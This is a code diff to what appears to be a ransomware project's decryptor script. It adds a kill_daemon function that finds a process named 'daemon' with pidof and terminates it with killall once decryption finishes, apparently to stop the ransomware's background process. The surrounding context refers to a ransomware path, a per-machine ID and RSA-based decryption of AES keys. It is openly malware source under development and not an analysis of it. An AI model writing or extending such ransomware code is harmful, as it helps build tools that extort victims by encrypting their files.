@@ -40,6 +40,13 @@ ransomware_path = os.path.join(home, ransomware_name)
 machine_id = enviroment.get_unique_machine_id()
 
 
+def kill_daemon():
+    process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = process.stdout.read() + process.stderr.read()
+    if(output):
+        os.system("killall daemon")
+
+
 def decrypt_aes_keys(enc, key):
     key_obj = RSA.importKey(key)
     cipher = PKCS1_OAEP.new(key_obj)
@@ -145,6 +152,9 @@ def menu():
 
     # end of decryptor
     print("{}Decryption finished!{}".format(GREEN, WHITE))
+
+    # kill deamon running on bg
+    kill_daemon()
 
 if __name__ == "__main__": 
     print(logo)
